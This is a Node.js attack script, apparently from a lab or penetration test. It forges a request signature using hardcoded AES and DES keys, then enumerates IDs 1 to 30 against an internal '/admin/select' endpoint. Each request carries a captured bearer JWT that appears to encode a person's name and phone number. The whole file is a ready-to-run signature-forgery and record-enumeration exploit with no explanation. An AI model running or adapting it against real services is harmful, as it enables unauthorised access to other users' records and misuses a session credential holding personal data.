const CryptoJS = require('crypto-js')
const axios = require('axios');  

function generateSign(id) {
    const base64Encoded = CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(id));

    const aesKey = CryptoJS.enc.Utf8.parse('1234567890123456'); 
    const aesEncrypted = CryptoJS.AES.encrypt(base64Encoded, aesKey, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    }).toString();

    const hexEncoded = CryptoJS.enc.Hex.stringify(CryptoJS.enc.Base64.parse(aesEncrypted));

    const desKey = CryptoJS.enc.Utf8.parse('12345678'); 
    const desEncrypted = CryptoJS.DES.encrypt(hexEncoded, desKey, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7
    }).toString();

    return desEncrypted; 
}  
  
async function sendAllRequests() {  
    for (let id = 1; id <= 30; id++) {  
        try {  
            await sendRequest(id);  
        } catch (error) {  
            console.error(`Error sending request for ID ${id}:`, error);  
        }  

    }  
}  
  
async function sendRequest(id) {  
    const sign = generateSign(id);  
    const payload = {  
        id: id.toString(),  
        sign: sign  
    };  
  
    try {  
        const response = await axios.post('http://192.168.238.250:8080/admin/select', payload, {  
            headers: {  
                'Content-Type': 'application/json',  
                'Cookie': 'Authorization=Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiLlvKDkuInkuowiLCJwaG9uZSI6IjE1MTQ5MDIyMTkyIiwiZXhwIjoxNzIzODI0NTY5fQ.c2tCjgtkFQ6IatQz-eOjt0TM1LfoH6L7EkuZb1XMl1Q'  
            }  
        });  
        console.log(`Response for ID ${id}:`, response.data);  
  

    } catch (error) {  
    }  
}  
  
sendAllRequests();
